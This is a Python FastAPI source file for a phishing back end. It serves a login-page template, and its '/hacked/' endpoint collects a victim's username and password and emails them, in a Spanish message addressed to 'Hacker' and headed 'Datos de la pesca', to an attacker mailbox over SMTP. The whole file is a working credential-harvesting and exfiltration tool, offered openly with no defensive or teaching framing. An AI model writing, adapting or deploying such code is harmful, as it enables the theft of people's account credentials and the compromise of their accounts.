from decouple import config
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi_mail import FastMail, MessageSchema, ConnectionConfig
from pydantic import BaseModel

app = FastAPI(debug=True)
app.mount('/assets', StaticFiles(directory='assets'), name='assets')
templates = Jinja2Templates(directory='templates')


class HackedUser(BaseModel):
    username: str
    password: str


conf = ConnectionConfig(
    MAIL_FROM="hacker_server@email.com",
    MAIL_USERNAME=config('MAIL_USERNAME'),
    MAIL_PASSWORD=config('MAIL_PASSWORD'),
    MAIL_PORT=config('MAIL_PORT'),
    MAIL_SERVER=config('MAIL_SERVER'),
    MAIL_TLS=True,
    MAIL_SSL=False,
    USE_CREDENTIALS=True
)


@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    context = {
        'request': request
    }
    return templates.TemplateResponse('index.html', context)


@app.post("/hacked/")
async def api_hacked(hacked_user: HackedUser):
    email = {'email': ['hacker@email.com']}

    user_dict = hacked_user.dict()

    template = f""" 
        <html> 
        <body>           
            <p>Hola Hacker!</p>
            <p>Estos son los datos de la victima<br>
            Usuario: <strong>{hacked_user.username}</strong><br>
            Password: <strong>{hacked_user.password}</strong><br>
            </p>
        </body> 
        </html> 
        """

    message = MessageSchema(
        subject="Datos de la pesca",
        recipients=email.get("email"),  # Lista de correos a donde se envia la data
        body=template,
        subtype="html"
    )

    fm = FastMail(conf)
    await fm.send_message(message)

    return user_dict
